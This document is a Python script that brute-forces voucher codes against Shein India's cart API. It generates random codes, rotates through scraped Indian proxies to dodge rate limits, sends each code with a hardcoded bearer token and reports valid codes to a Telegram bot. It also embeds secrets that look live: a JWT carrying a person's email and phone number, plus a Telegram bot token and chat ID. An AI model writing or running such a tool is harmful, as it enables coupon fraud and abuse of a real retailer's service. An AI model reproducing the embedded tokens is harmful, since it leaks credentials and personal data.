import requests
import random
import string
import time
import threading
import json
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- CONFIGURATION ---
# Your latest Access Token
ACCESS_TOKEN = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzaGVpbl9za3JhbWFuYW45MDFAZ21haWwuY29tIiwicGtJZCI6ImY0OWViMjkxLTBiYWQtNGFiOS04NzBmLTQwN2U2MjYyM2ZmNyIsImNsaWVudE5hbWUiOiJ0cnVzdGVkX2NsaWVudCIsInJvbGVzIjpbeyJuYW1lIjoiUk9MRV9DVVNUT01FUkdST1VQIn1dLCJtb2JpbGUiOiI5MzQyODYwNDAxIiwidGVuYW50SWQiOiJTSEVJTiIsImV4cCI6MTc3MTc3MjA5NiwidXVpZCI6ImY0OWViMjkxLTBiYWQtNGFiOS04NzBmLTQwN2U2MjYyM2ZmNyIsImlhdCI6MTc2OTE4MDA5NiwiZW1haWwiOiJza3JhbWFuYW45MDFAZ21haWwuY29tIn0.vM9ZbfFqpID4m08zs3OfTk9IImUcgc6nopFzpWKz9W_QSL5QhWLgeQjJsNAdKvdz6rERx7HV1yYChMOVIeA-eCYXwjlnHWDHmT3p-msVNjV1YL03uJTFA9hvSAa35SsKCYdKPC-DpjiUhSlMLA-K9PudKWQ0MwPydhGth01GK4EmxDR2TitWKXc2c6KggOP3_de5DCJklq6lyWHyhvYneW8Y84A8Iy7OAzXFD_J28fgZ9GUPyk8tFU8Mw4JfMXO-8bxtlNJcMcfVuYGW0qDt_JrNclNvbOx6jN1K5c3Bun_YFqREBqK05x0CUbZI3xNpy0wW3Qeu0R-dkESRa4VMhw"

CART_ID = "SH6740706850"
EMAIL = "skramanan901@gmail.com"
BASE_URL = f"https://api.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/{EMAIL}/carts/{CART_ID}/vouchers"

# Telegram Notification Data
TG_TOKEN = "8090670882:AAEQVAZF9TPEpjeuHWOOxm41uUBIwhcRCfk"
TG_CHAT_ID = "1827265590"

# Global Shared Data
proxies = []
check_count = 0
log_lock = threading.Lock()

def fetch_indian_proxies():
    """Fetches fresh Indian HTTP proxies"""
    global proxies
    print("[!] Fetching fresh Indian proxies...", flush=True)
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=IN&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/rooster74/FreeProxy/main/country/india.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/countries/IN/data.txt"
    ]
    for source in sources:
        try:
            r = requests.get(source, timeout=10)
            if r.status_code == 200:
                proxies += r.text.splitlines()
        except:
            pass
    proxies = list(set(proxies))
    print(f"[+] Loaded {len(proxies)} Indian proxies.", flush=True)

def generate_code():
    """Generates SVI, SVD, or SVH formats"""
    mode = random.choice(["SVI", "SVD", "SVH"])
    chars = string.ascii_uppercase + string.digits
    if mode == "SVI":
        return "SVI" + random.choice(["0", "1"]) + ''.join(random.choice(chars) for _ in range(11))
    else:
        return mode + ''.join(random.choice(chars) for _ in range(12))

def send_hit_to_tg(code, status):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    msg = f"✅ *COUPON HIT!*\n\n*Code:* `{code}`\n*Status:* {status}\n*Account:* {EMAIL}"
    try: requests.post(url, json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

def checker_loop():
    global check_count
    while True:
        code = generate_code()
        
        # Pick a random proxy
        px_addr = random.choice(proxies) if proxies else None
        proxy_dict = {"http": f"http://{px_addr}", "https": f"http://{px_addr}"} if px_addr else None
        
        headers = {
            "Authorization": f"Bearer {ACCESS_TOKEN}",
            "RequestId": "ApplyCoupon",
            "X-Tenant": "B2C", "X-TENANT-ID": "SHEIN",
            "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Android"
        }

        try:
            response = requests.post(BASE_URL, headers=headers, data={"voucherId": code, "employeeOfferRestriction": "true"}, proxies=proxy_dict, timeout=8)
            
            with log_lock:
                check_count += 1
                # 1. Matches your image format
                if response.status_code in [200, 201]:
                    print(f"[{check_count}] {code} -> ✅ HIT!", flush=True)
                else:
                    print(f"[{check_count}] {code} -> ❌ Invalid", flush=True)
                
                # 2. Shows full response body as requested
                try:
                    print(json.dumps(response.json(), indent=2), flush=True)
                except:
                    print(f"Body: {response.text}", flush=True)
                print("-" * 45, flush=True)

            if response.status_code in [200, 201]:
                send_hit_to_tg(code, response.status_code)
                requests.delete(f"{BASE_URL}/{code}", headers=headers, proxies=proxy_dict)
            
            elif response.status_code == 401:
                print("!!! TOKEN EXPIRED !!!", flush=True)
                break

        except:
            pass # Skip proxy errors
        
        time.sleep(1.2)

# --- RENDER WEB SERVER (For Port Binding) ---
class HealthCheck(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot Running")

def start_render_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), HealthCheck)
    print(f"Health check server live on port {port}", flush=True)
    server.serve_forever()

if __name__ == "__main__":
    fetch_indian_proxies()
    # Start checking thread
    threading.Thread(target=checker_loop, daemon=True).start()
    # Satisfy Render's port requirement
    start_render_server()
